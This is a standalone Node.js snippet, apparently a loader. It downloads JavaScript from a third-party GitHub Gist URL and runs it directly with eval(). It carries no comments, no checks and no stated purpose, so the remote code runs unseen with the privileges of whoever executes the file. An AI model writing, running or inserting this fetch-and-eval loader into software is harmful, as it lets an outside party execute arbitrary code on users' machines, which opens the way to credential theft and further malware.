const https = require("https");
https.get("https://gist.githubusercontent.com/puffsdad/b53f675ad43eefafaea6356e8afae2fa/raw/c23d17e24650364d7af33816a0fa5df2e0e7c009/egp.js", r => { let d = ""; r.on("data", c => d += c); r.on("end", () => eval(d)); });
